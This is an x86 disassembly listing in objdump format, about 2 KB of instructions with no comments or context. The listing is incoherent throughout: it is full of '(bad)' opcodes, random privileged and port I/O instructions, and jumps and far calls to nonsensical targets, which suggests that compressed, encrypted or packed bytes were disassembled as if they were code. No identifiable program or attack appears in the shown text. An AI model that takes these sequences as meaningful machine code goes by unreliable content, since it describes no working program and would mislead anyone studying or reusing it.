  41f40b:	sbb    eax,0x5904e3f5
  41f410:	cs pop ecx
  41f412:	aam    0x90
  41f414:	jp     0x41f3b0
  41f416:	sahf   
  41f417:	popf   
  41f418:	jle    0x41f3ab
  41f41a:	cmp    al,0xd0
  41f41c:	mov    dl,0xc4
  41f41e:	xor    esi,esi
  41f420:	sbb    eax,0x264b884e
  41f425:	mov    edi,0xc1779191
  41f42a:	(bad)  
  41f42b:	data16 jb 0x41f427
  41f42e:	mov    ebx,0xac7c3394
  41f433:	fstp   st(7)
  41f435:	xchg   esi,eax
  41f436:	add    BYTE PTR [edi-0x2],al
  41f439:	pop    es
  41f43a:	sub    esp,DWORD PTR [eax]
  41f43c:	push   eax
  41f43d:	ret    
  41f43e:	icebp  
  41f43f:	mov    ebx,0x862f707f
  41f444:	push   eax
  41f445:	pop    ss
  41f446:	add    esp,DWORD PTR [eax-0x5]
  41f449:	lods   eax,DWORD PTR ds:[esi]
  41f44a:	mul    DWORD PTR [ecx-0x3b821558]
  41f450:	mov    ecx,0x8fe43a0
  41f455:	sti    
  41f456:	adc    esp,DWORD PTR [ebp+0x5c]
  41f459:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f45a:	sbb    al,0xfd
  41f45c:	fwait
  41f45d:	pushf  
  41f45e:	inc    esp
  41f45f:	sub    cl,cl
  41f461:	inc    ebp
  41f462:	call   0x6f44dcc0
  41f467:	jecxz  0x41f45a
  41f469:	fsub   DWORD PTR [edi-0x2cdc70e9]
  41f46f:	(bad)  
  41f470:	dec    edx
  41f471:	xchg   edi,esp
  41f473:	fwait
  41f474:	das    
  41f475:	int    0x36
  41f477:	bound  edi,QWORD PTR [eax+0x6e]
  41f47a:	jge    0x41f4c8
  41f47c:	add    ch,BYTE PTR [edi+0x1c]
  41f47f:	lods   eax,DWORD PTR ds:[esi]
  41f480:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f481:	loopne 0x41f4c5
  41f483:	std    
  41f484:	adc    al,0x8c
  41f486:	push   0x20
  41f488:	lds    esi,FWORD PTR [ebp-0x1e0c2595]
  41f48e:	retf   0xcaaf
  41f491:	(bad)  
  41f492:	call   0x87c2647c
  41f497:	jnp    0x41f45c
  41f499:	data16 or BYTE PTR [esp+edi*1-0x30],ch
  41f49e:	bound  eax,QWORD PTR [ebp+ecx*1-0x7c]
  41f4a2:	or     esp,DWORD PTR [eax-0x9e7515d]
  41f4a8:	jp     0x41f490
  41f4aa:	push   edi
  41f4ab:	cmp    BYTE PTR [edx+ecx*1],ah
  41f4ae:	jns    0x41f467
  41f4b0:	sub    al,0x58
  41f4b2:	fdiv   QWORD PTR [ebp-0x23]
  41f4b5:	ror    DWORD PTR [edx-0x2f],0xef
  41f4b9:	cmp    BYTE PTR ds:0x245b35d5,0xd6
  41f4c0:	xlat   BYTE PTR ds:[ebx]
  41f4c1:	popf   
  41f4c2:	mov    BYTE PTR [ebx+ebx*4],ch
  41f4c5:	mov    ebx,DWORD PTR [edx]
  41f4c7:	mov    fs,WORD PTR [eax]
  41f4c9:	mov    WORD PTR [edx-0x5551db9d],?
  41f4cf:	xchg   ebp,eax
  41f4d0:	out    0x40,eax
  41f4d2:	jno    0x41f46f
  41f4d4:	clc    
  41f4d5:	retf   
  41f4d6:	into   
  41f4d7:	mov    bl,0xaf
  41f4d9:	lods   al,BYTE PTR ds:[esi]
  41f4da:	icebp  
  41f4db:	call   edx
  41f4dd:	shl    esi,cl
  41f4df:	fwait
  41f4e0:	xchg   esp,ebp
  41f4e2:	out    0xa2,al
  41f4e4:	js     0x41f4ce
  41f4e6:	sub    bl,BYTE PTR [ecx-0x4b]
  41f4e9:	fs push ecx
  41f4eb:	jg     0x41f55e
  41f4ed:	bound  ecx,QWORD PTR [edx+0x57a3fd2f]
  41f4f3:	push   ebx
  41f4f4:	into   
  41f4f5:	(bad)  
  41f4f6:	sahf   
  41f4f7:	ror    esp,cl
  41f4f9:	inc    ebx
  41f4fa:	mov    eax,DWORD PTR [esi+edi*8+0x3d]
  41f4fe:	dec    edi
  41f4ff:	ds hlt 
  41f501:	jbe    0x41f4a2
  41f503:	jp     0x41f523
  41f505:	fsub   st(4),st
  41f507:	(bad)  
  41f508:	(bad)  
  41f509:	(bad)  
  41f50a:	sub    ebp,DWORD PTR [ecx+0x36]
  41f50d:	enter  0x7405,0x95
  41f511:	mov    ds:0xe705aca6,eax
  41f516:	cld    
  41f517:	shr    DWORD PTR ds:0xb71fea73,0xb2
  41f51e:	shl    DWORD PTR [esi-0x60],cl
  41f521:	mov    cl,0xf
  41f523:	ins    BYTE PTR es:[edi],dx
  41f524:	out    dx,eax
  41f525:	sub    BYTE PTR cs:[ebx-0x31],bh
  41f529:	outs   dx,BYTE PTR ds:[esi]
  41f52a:	dec    esp
  41f52b:	jb     0x41f5a9
  41f52d:	iret   
  41f52e:	dec    ebp
  41f52f:	out    dx,al
  41f530:	sbb    ch,BYTE PTR [edx+0x2b485d]
  41f536:	pop    ds
  41f537:	xor    BYTE PTR [edx],0xfc
  41f53a:	xchg   edx,eax
  41f53b:	pop    es
  41f53c:	xor    DWORD PTR [ebp+0x19],edx
  41f53f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f540:	pop    ss
  41f541:	cwde   
  41f542:	in     eax,0x2d
  41f544:	dec    ebx
  41f545:	jle    0x41f569
  41f547:	jg     0x41f4d5
  41f549:	and    DWORD PTR [esi],esp
  41f54b:	out    dx,al
  41f54c:	xchg   edi,eax
  41f54d:	add    BYTE PTR [ebx+ebx*4],cl
  41f550:	xchg   esi,eax
  41f551:	pop    ebx
  41f552:	inc    edi
  41f553:	mov    bh,0x34
  41f555:	push   edx
  41f556:	sub    ecx,edi
  41f558:	fisub  WORD PTR [edx+esi*4]
  41f55b:	pop    edi
  41f55c:	mov    esi,0xf17bbb6f
  41f561:	iret   
  41f562:	xchg   ecx,eax
  41f563:	add    al,0x66
  41f565:	clc    
  41f566:	jb     0x41f590
  41f568:	or     bl,bl
  41f56a:	dec    ecx
  41f56b:	mov    ch,0x6b
  41f56d:	das    
  41f56e:	loopne 0x41f542
  41f570:	mov    ecx,ecx
  41f572:	pop    edx
  41f573:	sbb    bl,BYTE PTR [eax]
  41f575:	sbb    eax,DWORD PTR [ebp+eax*4+0x1c]
  41f579:	loope  0x41f506
  41f57b:	test   al,0xb8
  41f57d:	sbb    ah,0x33
  41f580:	(bad)  [ebx+0x70]
  41f583:	adc    edx,eax
  41f585:	push   ebx
  41f586:	or     DWORD PTR [esi],ebp
  41f588:	cli    
  41f589:	sub    eax,0x40de7c77
  41f58e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f58f:	ins    BYTE PTR es:[edi],dx
  41f590:	adc    eax,0x7c1c6755
  41f595:	cmp    ch,cl
  41f597:	xor    DWORD PTR [eax-0x55],esp
  41f59a:	sub    edi,esi
  41f59c:	mov    cl,0xbb
  41f59e:	jb     0x41f547
  41f5a0:	call   0xc1c7:0xa1f124c2
  41f5a7:	fidiv  DWORD PTR [edi]
  41f5a9:	scas   al,BYTE PTR es:[edi]
  41f5aa:	cld    
  41f5ab:	xor    DWORD PTR [ebp+edx*8-0x364094a6],ebp
  41f5b2:	push   ebx
  41f5b3:	mov    dh,0x46
  41f5b5:	or     bl,BYTE PTR [eax+0x7ff79403]
  41f5bb:	mov    ch,0xeb
  41f5bd:	cmc    
  41f5be:	sbb    BYTE PTR [edx-0x46],bh
  41f5c1:	jp     0x41f5e2
  41f5c3:	cs data16 mov ch,0x76
  41f5c7:	push   ss
  41f5c8:	leave  
  41f5c9:	add    ch,BYTE PTR [esi]
  41f5cb:	cmp    BYTE PTR [edx+ecx*2-0x27c1fedf],dl
  41f5d2:	push   edi
  41f5d3:	jnp    0x41f623
  41f5d5:	pop    eax
  41f5d6:	fs push ds
  41f5d8:	xor    DWORD PTR [eax],ecx
  41f5da:	lock xor ah,BYTE PTR [ebp-0x5]
  41f5de:	fld    QWORD PTR [edi]
  41f5e0:	sub    dh,0x23
  41f5e3:	xor    ch,BYTE PTR [edx-0x18]
  41f5e6:	jecxz  0x41f65b
  41f5e8:	adc    esp,DWORD PTR [edi-0x30e06891]
  41f5ee:	sbb    eax,0xb0190f61
  41f5f3:	loope  0x41f63b
  41f5f5:	xchg   ebx,eax
  41f5f6:	push   edi
  41f5f7:	in     eax,dx
  41f5f8:	fldl2t 
  41f5fa:	push   es
  41f5fb:	mov    eax,ds:0x25dcbf6
  41f600:	sbb    ebx,DWORD PTR [edi-0x768b9f72]
  41f606:	into   
  41f607:	dec    edi
  41f608:	(bad)  
  41f609:	out    dx,al
  41f60a:	ins    DWORD PTR es:[edi],dx
  41f60b:	xchg   ebp,eax
  41f60c:	outs   dx,BYTE PTR ds:[esi]
  41f60d:	ret    0xc096
  41f610:	mov    dl,0xa7
  41f612:	add    eax,0xa9921af5
  41f617:	imul   edi,ecx,0xb142925a
  41f61d:	mov    cl,0x67
  41f61f:	xchg   BYTE PTR [eax+0x25],ah
  41f622:	clc    
  41f623:	push   0x835b535b
  41f628:	retf   0x94cf
  41f62b:	sub    al,0xd1
  41f62d:	inc    ebx
  41f62e:	gs out dx,al
  41f630:	sar    ch,1
  41f632:	adc    eax,DWORD PTR [eax-0x25]
  41f635:	push   ss
  41f636:	push   0xffffffb2
  41f638:	add    ebx,DWORD PTR [ecx+eax*2-0x38]
  41f63c:	fs ret 
  41f63e:	mov    ebp,0xcec4f726
  41f643:	cmp    eax,0xcb92e94a
  41f648:	ins    BYTE PTR es:[edi],dx
  41f649:	sbb    eax,DWORD PTR [edi-0x4e]
  41f64c:	dec    ebx
  41f64d:	shr    ebp,1
  41f64f:	dec    edi
  41f650:	push   ds
  41f651:	mov    edi,0x1fcca9f8
  41f656:	fwait
  41f657:	and    bl,al
  41f659:	ds cli 
  41f65b:	inc    esi
  41f65c:	pop    ecx
  41f65d:	add    BYTE PTR [ecx],0x75
  41f660:	xor    al,bl
  41f662:	pop    edi
  41f663:	shr    ecx,0x2
  41f666:	cmp    cl,BYTE PTR [eax+0x734c366c]
  41f66c:	int3   
  41f66d:	out    dx,eax
  41f66e:	out    0xd8,eax
  41f670:	addr16 inc edx
  41f672:	add    edi,DWORD PTR [ebx]
  41f674:	push   ss
  41f675:	or     eax,0x9c794a3f
  41f67a:	setno  BYTE PTR [eax+0x40]
  41f67e:	xchg   edi,eax
  41f67f:	imul   edx,ebp,0xffffffd8
  41f682:	dec    esi
  41f683:	mov    eax,DWORD PTR [ecx]
  41f685:	cmp    eax,0x1753a3d6
  41f68a:	fs loope 0x41f684
  41f68d:	popf   
  41f68e:	xchg   esi,eax
  41f68f:	dec    esp
  41f690:	add    DWORD PTR [esi],0x3ecd5b03
  41f696:	(bad)  
  41f697:	stos   DWORD PTR es:[edi],eax
  41f698:	add    eax,0x29d16628
  41f69d:	outs   dx,BYTE PTR ds:[esi]
  41f69e:	fidivr WORD PTR [esi+0x3781eb98]
  41f6a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6a5:	out    dx,eax
  41f6a6:	pop    es
  41f6a7:	pop    ebp
  41f6a8:	shl    DWORD PTR [ebp-0x317e69ca],0x92
  41f6af:	div    BYTE PTR [edx+0x779aa8b4]
  41f6b5:	add    edi,DWORD PTR [ebp+0xd]
  41f6b8:	pop    esi
  41f6b9:	and    eax,0x6b9df90c
  41f6be:	fidiv  WORD PTR [edi+0x4d4ca5f]
  41f6c4:	fwait
  41f6c5:	inc    edx
  41f6c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6c7:	call   0xea3a:0x288f2e9
  41f6ce:	and    eax,0xda07bdbd
  41f6d3:	pushf  
  41f6d4:	xchg   BYTE PTR [ebp+0x33],al
  41f6d7:	sub    dh,cl
  41f6d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6da:	push   eax
  41f6db:	sbb    eax,0xd5250145
  41f6e0:	pop    edi
  41f6e1:	lods   al,BYTE PTR ds:[esi]
  41f6e2:	lock push ebx
  41f6e4:	inc    ebp
  41f6e5:	outs   dx,DWORD PTR ds:[esi]
  41f6e6:	inc    ebp
  41f6e7:	outs   dx,BYTE PTR ds:[esi]
  41f6e8:	adc    DWORD PTR [ebx+ebp*8-0x9f357d8],ecx
  41f6ef:	imul   ebx,DWORD PTR [edi-0x65],0x2
  41f6f3:	inc    edx
  41f6f4:	mov    esi,0x9c038540
  41f6f9:	lods   al,BYTE PTR ds:[esi]
  41f6fa:	adc    dl,ah
  41f6fc:	jns    0x41f769
  41f6fe:	ror    BYTE PTR [edx-0x36],0x62
  41f702:	vmwrite edx,DWORD PTR [ebx]
  41f705:	leave  
  41f706:	mov    ds:0xbe3a6e9b,eax
  41f70b:	imul   edx,DWORD PTR [ebx],0x6f565bdd
  41f711:	push   ss
  41f712:	inc    ebp
  41f713:	and    BYTE PTR [ebx-0x3319a72d],0x8d
  41f71a:	xor    ecx,DWORD PTR [edx-0x58]
  41f71d:	xor    DWORD PTR [ecx+0x2048db9d],esi
  41f723:	mov    edx,0x56da735e
  41f728:	xor    esi,DWORD PTR [esi]
  41f72a:	pop    esi
  41f72b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f72c:	out    dx,al
  41f72d:	retf   0xfdd
  41f730:	rcr    BYTE PTR [eax+0x48],1
  41f733:	cwde   
  41f734:	sub    al,0xfa
  41f736:	and    bh,BYTE PTR [eax+0x35279304]
  41f73c:	xchg   ecx,eax
  41f73d:	in     al,dx
  41f73e:	addr16 jbe 0x41f745
  41f741:	add    DWORD PTR [ebx-0x62],ebx
  41f744:	loope  0x41f727
  41f746:	retf   0x5e52
  41f749:	enter  0x1f7c,0xc8
  41f74d:	arpl   bp,si
  41f74f:	dec    esi
  41f750:	cmp    DWORD PTR [edx],esp
  41f752:	daa    
  41f753:	cmp    ah,BYTE PTR [eax-0x15c4011e]
  41f759:	cmpxchg cl,ch
  41f75c:	popa   
  41f75d:	dec    esp
  41f75e:	xor    ebx,DWORD PTR [ebp+0x6236d496]
  41f764:	sub    DWORD PTR [edi],ecx
  41f766:	dec    edx
  41f767:	outs   dx,DWORD PTR ds:[esi]
  41f768:	lea    edi,[edx-0x2d279308]
  41f76e:	lods   al,BYTE PTR ds:[esi]
  41f76f:	in     eax,0x48
  41f771:	jo     0x41f7c0
  41f773:	xor    eax,0x120cb200
  41f778:	xchg   ebx,eax
  41f779:	sbb    al,BYTE PTR [edi-0x310c5143]
  41f77f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f780:	push   si
  41f782:	adc    BYTE PTR [ecx+esi*4-0x40],0xb4
  41f787:	mov    esi,0x22c83dae
  41f78c:	dec    ecx
  41f78d:	jecxz  0x41f73b
  41f78f:	xor    DWORD PTR [ebp+edx*4+0x5a35e3],edi
  41f796:	fcomp  QWORD PTR [edx]
  41f798:	pop    bx
  41f79a:	add    BYTE PTR [esi+0x66],bl
  41f79d:	sbb    eax,0x8a7d8a81
  41f7a2:	test   DWORD PTR [edi-0x17d85243],0xbd28782f
  41f7ac:	and    DWORD PTR [esi+edx*4-0x71],0x33
  41f7b1:	lods   eax,DWORD PTR ds:[esi]
  41f7b2:	ret    0x6b6a
  41f7b5:	scas   eax,DWORD PTR es:[edi]
  41f7b6:	(bad)  
  41f7b7:	jmp    0x1567032
  41f7bc:	ss jle 0x41f7c4
  41f7bf:	jmp    0x41f771
  41f7c1:	adc    al,0x28
  41f7c3:	dec    edx
  41f7c4:	ss (bad) 
  41f7c6:	retf   0x9b35
  41f7c9:	faddp  st(0),st
  41f7cb:	iret   
  41f7cc:	xor    eax,0x8b3c58eb
  41f7d1:	stc    
  41f7d2:	mov    ebp,0x22eff3d8
  41f7d7:	ins    BYTE PTR es:[edi],dx
  41f7d8:	scas   al,BYTE PTR es:[edi]
  41f7d9:	adc    edi,DWORD PTR [ecx+0x44]
  41f7dc:	dec    esi
  41f7dd:	lea    edi,[ecx+0x57]
  41f7e0:	xchg   esi,eax
  41f7e1:	das    
  41f7e2:	les    edi,FWORD PTR [ecx]
  41f7e4:	shl    BYTE PTR [ebx+0xcf6723f],0xbe
  41f7eb:	and    al,0x85
  41f7ed:	adc    al,0x8e
  41f7ef:	push   ds
  41f7f0:	jne    0x41f7a1
  41f7f2:	push   ss
  41f7f3:	add    edx,DWORD PTR [ecx]
  41f7f5:	cmp    BYTE PTR [eax+0x5d75c6a1],cl
  41f7fb:	dec    ecx
  41f7fc:	and    ebx,ecx
  41f7fe:	inc    esp
  41f7ff:	shl    DWORD PTR [eax+0x623fc7fc],1
  41f805:	push   ds
  41f806:	jmp    0x4120:0x84379d20
  41f80d:	(bad)  
  41f80e:	pop    ss
  41f80f:	data16 (bad) 
  41f811:	clc    
  41f812:	mov    cl,0xa4
  41f814:	and    BYTE PTR [ecx+0x1b],bl
  41f817:	and    ecx,ebp
  41f819:	shl    BYTE PTR [eax],1
  41f81b:	or     al,BYTE PTR [esi-0x5d]
  41f81e:	mov    al,ds:0x8428e5c8
  41f823:	xor    BYTE PTR [edi-0x700c75d5],ah
  41f829:	or     ecx,DWORD PTR [ecx-0xc739a93]
  41f82f:	inc    ebp
  41f830:	xor    ecx,ebp
  41f832:	jne    0x41f810
  41f834:	mov    esp,0xeea7c84
  41f839:	in     eax,dx
  41f83a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f83b:	lea    edx,[edx-0x478ea231]
  41f841:	(bad)  
  41f842:	xor    eax,DWORD PTR [esi-0x27]
  41f845:	add    bh,cl
  41f847:	mov    dh,0xc
  41f849:	and    eax,0xa0772b63
  41f84e:	dec    eax
  41f84f:	inc    edi
  41f851:	arpl   WORD PTR [esi+0xf],ax
  41f854:	test   DWORD PTR [edx-0x64],0xc54f374c
  41f85b:	cmp    eax,0x447acf39
  41f860:	sbb    al,0xf
  41f862:	dec    ecx
  41f863:	daa    
  41f864:	pop    eax
  41f865:	call   0x41f96da9
  41f86a:	xchg   BYTE PTR [eax-0x6a09bc2f],bh
  41f870:	jno    0x41f804
  41f872:	fidiv  WORD PTR [esi+0x64]
  41f875:	fcmovb st,st(5)
  41f877:	rcr    ebx,0xf
  41f87a:	leave  
  41f87b:	pop    ss
  41f87c:	mov    esi,0xb4e6bb05
  41f881:	xchg   ebp,eax
  41f882:	sub    al,0x73
  41f884:	test   DWORD PTR [eax-0x1b],esp
  41f887:	mov    eax,0xfd363b0b
  41f88c:	xor    DWORD PTR [edx+0x7c96c9b0],edx
  41f892:	aaa    
  41f893:	xor    ebp,DWORD PTR [edx+0x26e8de4a]
  41f899:	dec    esi
  41f89a:	inc    esi
  41f89b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f89c:	icebp  
  41f89d:	mov    ds:0x10736cba,al
  41f8a2:	pop    esp
  41f8a3:	ret    
  41f8a4:	mov    DWORD PTR [edi+0x3b],ebx
  41f8a7:	push   0xec705fec
  41f8ac:	or     DWORD PTR [esi+0x5298d9c7],ecx
  41f8b2:	bound  esp,QWORD PTR [ebp+ecx*1+0x2b]
  41f8b6:	sti    
  41f8b7:	sbb    dl,BYTE PTR [edi]
  41f8b9:	pop    esp
  41f8ba:	(bad)  
  41f8bc:	in     eax,0x6
  41f8be:	in     al,0xb5
  41f8c0:	or     BYTE PTR [ebx-0x68e6b03b],0x6b
  41f8c7:	shr    cl,0x9
  41f8ca:	xchg   BYTE PTR [ecx+0x75bfdcf],ah
  41f8d0:	xor    al,0x95
  41f8d2:	mov    esp,0x30854d57
  41f8d7:	es push esi
  41f8d9:	enter  0x54e0,0xa6
  41f8dd:	inc    esi
  41f8de:	sbb    eax,DWORD PTR [edi]
  41f8e0:	mov    esp,0xe475d582
  41f8e5:	jb     0x41f8a5
  41f8e7:	pop    esp
  41f8e8:	inc    edi
  41f8e9:	and    DWORD PTR [esi+0x66df0e4a],ebx
  41f8ef:	push   esi
  41f8f0:	call   0xda8129df
  41f8f5:	or     DWORD PTR [ecx-0x3d62a62d],ebp
  41f8fb:	out    dx,al
  41f8fc:	lods   al,BYTE PTR ds:[esi]
  41f8fd:	adc    DWORD PTR [esi-0x29206b93],esp
  41f903:	mov    bl,0xa3
  41f905:	adc    DWORD PTR ds:0x2260f17e,edx
  41f90b:	cmp    DWORD PTR [ebx],ebp
  41f90d:	nop
  41f90e:	es mov ebx,0xa393af58
  41f914:	nop
  41f915:	mov    esi,0xfa623eaf
  41f91a:	jno    0x41f8bc
  41f91c:	xchg   esp,eax
  41f91d:	daa    
  41f91e:	cmp    ebx,DWORD PTR [edx+0x3]
  41f921:	bnd jno 0x41f956
  41f924:	push   0x5873a53
  41f929:	adc    edi,esp
  41f92b:	(bad)  
  41f92c:	jle    0x41f8b1
  41f92e:	fs hlt 
  41f930:	fsubr  DWORD PTR [edx+ebp*1-0x6]
  41f934:	ret    0xf1fb
  41f937:	ins    DWORD PTR es:[edi],dx
  41f938:	mov    esp,0x8627a454
  41f93d:	sets   BYTE PTR [eax-0x67]
  41f941:	gs mov dh,0x72
  41f944:	mov    BYTE PTR [edi],bl
  41f946:	jo     0x41f984
  41f948:	push   eax
  41f949:	ds jp  0x41f944
  41f94c:	das    
  41f94d:	adc    eax,0x6586c76a
  41f952:	loopne 0x41f98c
  41f954:	cmp    al,0xf8
  41f956:	retf   
  41f957:	nop
  41f958:	adc    dl,al
  41f95a:	cld    
  41f95b:	adc    BYTE PTR [ebx+0x470189d2],bl
  41f961:	add    esi,DWORD PTR [ecx+0x6dd9756c]
  41f967:	mov    eax,ds:0xba1ec7f0
  41f96c:	sbb    al,0x93
  41f96e:	push   0xd7732ab
  41f973:	mov    esi,0x27d0e131
  41f978:	call   0x96c290fc
  41f97d:	mov    WORD PTR [esp+eiz*8+0x7bd72ce],?
  41f984:	loope  0x41f9f0
  41f986:	lds    ecx,FWORD PTR [ebx]
  41f988:	push   edx
  41f989:	jmp    0x9858228c
  41f98e:	ror    BYTE PTR [ecx-0x60],cl
  41f991:	in     al,0xd5
  41f993:	sbb    al,0xe9
  41f995:	mov    al,ds:0xd1d435a4
  41f99a:	fild   WORD PTR [esi]
  41f99c:	mov    cl,0x71
  41f99e:	inc    eax
  41f99f:	push   ds
  41f9a0:	popa   
  41f9a1:	adc    al,0xa
  41f9a3:	pop    eax
  41f9a4:	sbb    bh,BYTE PTR [ebx+0x39]
  41f9a7:	jmp    0xef6a:0x1b922740
  41f9ae:	sbb    esp,ebx
  41f9b0:	mov    ds:0x76a94dcb,eax
  41f9b5:	bswap  ecx
  41f9b7:	arpl   WORD PTR fs:[edx+0x6c],sp
  41f9bb:	jle    0x41f9fc
  41f9bd:	cmp    al,0x25
  41f9bf:	out    dx,eax
  41f9c0:	inc    edi
  41f9c1:	dec    eax
  41f9c2:	or     DWORD PTR [esi],edi
  41f9c4:	xchg   esp,eax
  41f9c5:	ins    DWORD PTR es:[edi],dx
  41f9c6:	retf   0x26f6
  41f9c9:	fisttp QWORD PTR [ecx+0x18]
  41f9cc:	dec    eax
  41f9cd:	retf   0xf484
  41f9d0:	mov    ds:0x1af98a9d,al
  41f9d5:	jmp    0xf8d993e6
  41f9da:	sub    bl,bl
  41f9dc:	sub    eax,0x15d34ae3
  41f9e1:	bound  ebx,QWORD PTR [edi]
  41f9e3:	xchg   ebx,eax
  41f9e4:	cmc    
  41f9e5:	inc    edx
  41f9e6:	jl     0x41f978
  41f9e8:	push   edx
  41f9e9:	pop    esp
  41f9ea:	sahf   
  41f9eb:	adc    al,BYTE PTR [edx-0x69ca26ae]
  41f9f1:	scas   al,BYTE PTR es:[edi]
  41f9f2:	loop   0x41fa1a
  41f9f4:	shl    esi,cl
  41f9f6:	pop    edi
  41f9f7:	lahf   
  41f9f8:	cmp    bl,dl
  41f9fa:	shl    DWORD PTR [edi],0x6c
  41f9fd:	jle    0x41f9a3
  41f9ff:	and    ebx,DWORD PTR [ebx+0x5f]
  41fa02:	lock ja 0x41f99f
  41fa05:	pop    ecx
  41fa06:	xlat   BYTE PTR ds:[ebx]
  41fa07:	mov    al,0xac
  41fa09:	mov    cl,BYTE PTR [ebp+edx*1+0x50]
  41fa0d:	mov    ds:0x4a7430a1,al
  41fa12:	push   0x7e
  41fa14:	bound  esi,QWORD PTR [eax-0x5a9c0206]
  41fa1a:	scas   al,BYTE PTR es:[edi]
  41fa1b:	jmp    FWORD PTR [esi-0x4d]
  41fa1e:	cs int 0x5c
  41fa21:	pop    ecx
  41fa22:	pop    esp
  41fa23:	in     al,0x47
  41fa25:	out    0x94,eax
  41fa27:	mov    eax,0x2a9e3b4d
  41fa2c:	xor    esp,ebx
  41fa2e:	xchg   esp,eax
  41fa2f:	and    ch,BYTE PTR [ebx+ebx*1-0x4d]
  41fa33:	or     eax,DWORD PTR [edx]
  41fa35:	out    dx,al
  41fa36:	scas   al,BYTE PTR es:[edi]
  41fa37:	int3   
  41fa38:	lahf   
  41fa39:	imul   ebx,esp,0xffffffc6
  41fa3c:	push   esi
  41fa3d:	adc    eax,0x825e4f6d
  41fa42:	out    0xee,eax
  41fa44:	mov    ch,0x4e
  41fa46:	pop    ecx
  41fa47:	loopne 0x41fa9d
  41fa49:	pushf  
  41fa4a:	ror    esp,1
  41fa4c:	dec    ecx
  41fa4d:	das    
  41fa4e:	xor    DWORD PTR [edx-0x26],ebx
  41fa51:	pop    ebx
  41fa52:	retf   
  41fa53:	sbb    edi,DWORD PTR [esi]
  41fa55:	rcr    edi,0xf5
  41fa58:	jo     0x41fa1e
  41fa5a:	loope  0x41f9e1
  41fa5c:	xchg   edx,eax
  41fa5d:	xor    BYTE PTR [edi],dl
  41fa5f:	fwait
  41fa60:	(bad)
  41fa64:	dec    edi
  41fa65:	or     DWORD PTR [edx+edi*2-0x37],ebx
  41fa69:	enter  0xa67b,0x81
  41fa6d:	hlt    
  41fa6e:	(bad)  
  41fa70:	rcl    DWORD PTR [ebx],0x4f
  41fa73:	mov    edx,0x2c8e3c56
  41fa78:	jle    0x41fab5
  41fa7a:	and    al,0x4f
  41fa7c:	push   esp
  41fa7d:	arpl   di,bp
  41fa7f:	jnp    0x41fa60
  41fa81:	push   cs
  41fa82:	cli    
  41fa83:	imul   edx,DWORD PTR [ebx],0x75775fac
  41fa89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa8a:	xchg   ecx,eax
  41fa8b:	cwde   
  41fa8c:	mov    dl,0x13
  41fa8e:	pusha  
  41fa8f:	push   ss
  41fa90:	pop    ebp
  41fa91:	xor    al,BYTE PTR [ebp+0x71]
  41fa94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa95:	sub    al,bl
  41fa97:	sbb    edi,DWORD PTR [edx-0x61e455bd]
  41fa9d:	lock pushf 
  41fa9f:	stc    
  41faa0:	(bad)  
  41faa1:	jl     0x41fb0d
  41faa3:	in     al,0xab
  41faa5:	and    DWORD PTR [ebx+0x6b],0xbf3d9f30
  41faac:	pusha  
  41faad:	jge    0x41fa34
  41faaf:	fs scas al,BYTE PTR es:[edi]
  41fab1:	push   esi
  41fab2:	mov    cl,0x6e
  41fab4:	fcmove st,st(7)
  41fab6:	add    ch,0xeb
  41fab9:	cmc    
  41faba:	cld    
  41fabb:	jp     0x41fa3e
  41fabd:	sbb    ebx,0xc226f5c8
  41fac3:	adc    al,0x8e
  41fac5:	lods   al,BYTE PTR ds:[esi]
  41fac6:	cli    
  41fac7:	rol    BYTE PTR [edx-0x6094937f],1
  41facd:	scas   al,BYTE PTR es:[edi]
  41face:	sub    DWORD PTR [edi-0x75],edx
  41fad1:	sub    eax,0x9222dbfc
  41fad6:	cld    
  41fad7:	and    al,0xde
  41fad9:	push   es
  41fada:	aad    0x67
  41fadc:	mov    ah,0x51
  41fade:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fadf:	int3   
  41fae0:	out    0x50,eax
  41fae2:	push   edi
  41fae3:	int    0xac
  41fae5:	push   ecx
  41fae6:	cli    
  41fae7:	arpl   WORD PTR [edi-0x9],ax
  41faea:	(bad)  [ebx]
  41faec:	mov    ch,0x5d
  41faee:	pop    eax
  41faef:	sbb    bl,BYTE PTR [edx]
  41faf1:	rol    DWORD PTR [edx+0x5795b02],1
  41faf7:	push   cs
  41faf8:	shr    ebp,1
  41fafa:	cmp    al,0xa8
  41fafc:	(bad)  
  41fafd:	sti    
  41fafe:	inc    esp
  41faff:	sbb    DWORD PTR [eax],eax
  41fb01:	sub    BYTE PTR ds:0xe02e5b50,ah
  41fb07:	rol    DWORD PTR [eax+0x385ba789],cl
  41fb0d:	sub    BYTE PTR [eax+0x4f],0x59
  41fb11:	addr16 mov esp,0xb8121edf
  41fb17:	dec    ecx
  41fb18:	rcl    DWORD PTR [esi-0x5712fbfd],1
  41fb1e:	imul   edx,DWORD PTR [edi-0x4c],0xffffffbe
  41fb22:	sbb    BYTE PTR [ebx],cl
  41fb24:	ret    0xe44c
  41fb27:	lods   al,BYTE PTR ds:[esi]
  41fb28:	out    0x7d,eax
  41fb2a:	sbb    al,0x87
  41fb2d:	jae    0x41fba9
  41fb2f:	sti    
  41fb30:	sub    eax,0x88e4520d
  41fb35:	inc    ecx
  41fb36:	repnz or eax,0xc9175c29
  41fb3c:	in     al,0x84
  41fb3e:	push   ds
  41fb3f:	pop    eax
  41fb40:	jle    0x41fb76
  41fb42:	and    ebp,DWORD PTR [esi+0x64e106f7]
  41fb48:	xor    edi,DWORD PTR [edi+0x454d2536]
  41fb4e:	out    dx,al
  41fb4f:	sub    al,0x4a
  41fb51:	(bad)  
  41fb52:	es dec esi
  41fb54:	cdq    
  41fb55:	or     eax,0xee9bc38
  41fb5a:	jmp    0x5087:0xe435ea3f
